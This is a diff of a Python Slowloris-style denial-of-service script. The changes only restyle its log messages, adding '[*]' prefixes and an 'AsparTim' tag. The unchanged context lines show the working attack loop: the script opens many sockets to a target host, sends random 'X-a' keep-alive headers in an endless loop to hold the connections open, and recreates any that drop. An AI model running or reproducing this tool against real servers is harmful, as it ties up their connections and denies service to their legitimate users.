@@ -96,19 +96,19 @@ def init_socket(ip):
 def main():
     ip = args.host
     socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+    logging.info("[*] Attacking %s With %s Sockets .", ip, socket_count)
 
-    logging.info("Creating sockets...")
+    logging.info("[*] Creating Sockets . . .")
     for _ in range(socket_count):
         try:
-            logging.debug("Creating socket nr %s", _)
+            logging.debug("[*] Creating Socket nr %s", _)
             s = init_socket(ip)
         except socket.error:
             break
         list_of_sockets.append(s)
 
     while True:
-        logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
+        logging.info("[*] Packet Sent ✓ AsparTim : %s", len(list_of_sockets))
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
@@ -116,7 +116,7 @@ def main():
                 list_of_sockets.remove(s)
 
         for _ in range(socket_count - len(list_of_sockets)):
-            logging.debug("Recreating socket...")
+            logging.debug("[*]Recreating Socket . . .")
             try:
                 s = init_socket(ip)
                 if s:
